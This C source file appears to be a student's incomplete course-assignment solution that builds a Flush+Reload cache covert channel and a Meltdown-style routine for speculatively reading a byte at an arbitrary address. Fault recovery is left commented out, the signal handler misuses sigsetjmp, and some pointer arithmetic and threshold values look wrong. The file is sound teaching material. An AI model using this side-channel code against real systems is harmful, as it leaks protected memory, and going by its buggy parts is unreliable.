#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>

#define u64 uint64_t
#define i64 int64_t

/*
Task 1 - Build a covert channel (30%)

The covert channel consists of four functions. The function cc_init() initializes the covert channel, 
setting up whatever memory it needs. cc_setup() sets the channel for sending a byte. 
cc_transmit(uint8_t value) transmits a value through the channel, and int cc_receive() returns the 
value it receives, or -1 if no value has been received. In the case that multiple values appear to 
have been sent, the function can arbitrarily choose which one to return.

For a channel, we will use the Flush+Reload attack. Basically, cc_init allocates space for 256 
different cache lines that the transmit function uses. cc_setup flushes these lines from the cache, 
cc_transmit accesses one of these cache lines based on the transmitted value, and cc_receive checks 
which of the cache lines is cached. To overcome prefetchers, we want each of these cache lines to 
reside in a different memory page.

Your task is to implement the four functions, test the accuracy of the covert channel, and report.
*/
static jmp_buf sig_buf;
static void *cc_buffer;
static size_t cc_buf_size = 256 * 4096; // 256 cache lines, 4096 bytes apart (mem pages)
static u64 threshold = 180; // should be below 160 , but whatever

static void wait(uint64_t cycles) {
	unsigned int ignore;
	uint64_t start = __rdtscp(&ignore);
	while (__rdtscp(&ignore) - start < cycles);
}

static inline void maccess(void *p) {
    asm volatile("mov eax, [%0]\n" : : "c"(p) : "eax");
}
static void flush(void *p) {
    asm volatile("clflush [%0]\n" : : "c"(p) : "eax");
}

static inline u64 my_rdtsc() {
  u64 a = 0, d = 0;
  asm volatile("mfence;rdtscp;mfence;" : "=a"(a), "=d"(d) :: "rcx");
  a = (d << 32) | a;
  return a;
}

static void flush_buf(){
    for (int i=0; i<(int) cc_buf_size/4096;i++){
        flush(&cc_buffer[i*512+i]);
    }
}

static void segfault_handler(int signum) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
    sigsetjmp(sig_buf, 0);
}


static void cc_init() {
	// Implement
	// allocate 256 different cache lines on differenz mem pages
	cc_buffer = mmap(NULL, cc_buf_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	if (cc_buffer == MAP_FAILED) {
        perror("cc_init: mmap failed");
        return;
	}
}

// cc_setup() sets the channel for sending a byte. 
static void cc_setup() {
    memset(cc_buffer, 0xaa, cc_buf_size); // write something -> avoid null page
    flush_buf();
}

// cc_transmit(uint8_t value) transmits a value through the channel
static void cc_transmit(uint8_t value) {
    maccess(&cc_buffer[value*512+value]);
}

// int cc_receive() returns the value it receives, or -1 if no value has been received
static int cc_receive() {
    u64 time;
    void *cur_adrs;
    for (int i=0; i< (int)cc_buf_size/4096;i++){
        asm volatile("mfence\n");
        cur_adrs=&cc_buffer[i*512+i];
        time = my_rdtsc();
        maccess(cur_adrs);
        time = my_rdtsc() - time;
        flush(cur_adrs);
        //printf("%lu;", time); // this stabilizes the measurement lol (uncommented, we get less 254 fails)
        if (time<threshold) {
            printf("\n");
            return i;
        } 
    }
    printf("\n");
    return -1;
}

static void meltdown(uintptr_t adrs) {
    static volatile int tmp[1024] = {1};
    _mm_clflush((void *)(tmp + 512));
    cc_setup();
    _mm_lfence();
    tmp[512] += 1;
    uint8_t rv = *((uint8_t *)adrs);
    cc_transmit(rv);
}


/* The main problem of the code in meltdown is that if called with 
   an invalid address, it crashes. In this task, you will implement 
   the function int do_meltdown(uintptr_t adrs), which calls 
   meltdown, recovers from the fault, receives the transmitted 
   value from the channel, and returns it. You may want to read the 
   man pages of signal(2) and sigsetjmp(3). Make sure that you can 
   call do_meltdown several times without crash or hang. You may 
   assume that the program does some one-time setup before calling 
   do_meltdown.

*/
static int do_meltdown(uintptr_t adrs) {
    // Init segfault handler
    // if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
        // printf("Failed to setup signal handler\n");
        // return -1;
    // }
    
    // call meltdown
    meltdown(adrs);
    int ret = cc_receive();
  
  
  
    return ret;
}

#ifdef MELTDOWNCASE
int main(){
    wait(1E9);
    printf("TODO\n");
    cc_init();
    //uint8_t test_num = 8;
    //meltdown((uintptr_t) &test_num);
    //printf("%i\n", cc_receive());
    
    printf("%i\n", do_meltdown( (uintptr_t) &cc_buffer[183000]));
    printf("%i\n", do_meltdown( (uintptr_t) &cc_buffer[183000]));
    printf("%i\n", do_meltdown( (uintptr_t) &cc_buffer[183000]));
    printf("%i\n", do_meltdown( (uintptr_t) &cc_buffer[183000]));
    munmap(cc_buffer, cc_buf_size);
    return 0;
}
#endif
